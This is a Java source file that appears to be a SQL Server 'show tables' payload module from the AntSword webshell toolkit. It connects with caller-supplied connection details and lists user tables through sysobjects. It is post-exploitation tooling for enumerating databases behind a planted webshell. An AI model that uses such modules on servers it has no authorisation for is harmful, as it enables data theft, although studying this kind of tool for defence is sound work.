package database.sqlserver;

import antSword.Template;

import java.sql.*;

public class Show_tables extends Template {
    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargencode");
        String z2 = getParam("antswordargconn");
        String z3 = getParam("antswordargdb");
        return showTables(z1, z2, z3);

    }

    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
            throws Exception {
        String ret = "";
        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
        Class.forName(x[0].trim());
        String url = x[1];
        Connection c = DriverManager.getConnection(url);
        Statement stmt = c.createStatement();
        ResultSet rs = stmt.executeQuery(sql);
        ResultSetMetaData rsmd = rs.getMetaData();

        if (needcoluname) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnName = rsmd.getColumnName(i);
                ret += columnName + columnsep;
            }
            ret += rowsep;
        }

        while (rs.next()) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnValue = rs.getString(i);
                ret += columnValue + columnsep;
            }
            ret += rowsep;
        }
        return ret;
    }

    String showTables(String encode, String conn, String dbname) throws Exception {
        String sql = "SELECT [name] FROM sysobjects WHERE xtype='U' ORDER BY 1";
        String columnsep = "\t";
        String rowsep = "";
        return executeSQL(encode, conn, sql, columnsep, rowsep, false);
    }
}